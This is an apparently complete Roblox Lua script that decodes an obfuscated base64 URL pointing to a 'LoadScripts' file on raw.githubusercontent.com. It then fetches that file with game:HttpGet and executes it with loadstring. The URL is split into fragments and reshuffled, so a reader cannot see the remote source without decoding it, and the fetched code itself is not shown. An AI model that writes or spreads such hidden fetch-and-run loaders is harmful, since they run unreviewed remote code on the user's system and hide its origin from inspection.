if not game:IsLoaded() then
	game.Loaded:Wait()
end

task.spawn(function()
	while true do
		task.wait(2)
	end
end)

local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='

local function d(data)
	data = string.gsub(data, '[^'..b..'=]', '')
	return (data:gsub('.', function(x)
		if x == '=' then return '' end
		local r,f='',(b:find(x)-1)
		for i=6,1,-1 do
			r = r .. (f % 2^i - f % 2^(i-1) > 0 and '1' or '0')
		end
		return r
	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
		if #x ~= 8 then return '' end
		local c=0
		for i=1,8 do
			c = c + (x:sub(i,i)=='1' and 2^(8-i) or 0)
		end
		return string.char(c)
	end))
end

local a = "aHR0cHM6Ly9yYXcuZ2l0aHVi"
local b1 = "dXNlcmNvbnRlbnQuY29tL05v"
local c = "TmFtZTk5ODkvTG9yZEd1eS9y"
local d1 = "ZWZzL2hlYWRzL21haW4vTG9h"
local e = "ZFNjcmlwdHM="

local encoded = c .. a .. e .. b1 .. d1

local real = string.sub(encoded, #c+1, #c+#a) ..
             string.sub(encoded, #c+#a+#e+1, #c+#a+#e+#b1) ..
             c ..
             d1 ..
             e

local url = d(real)

loadstring(game:HttpGet(url))()
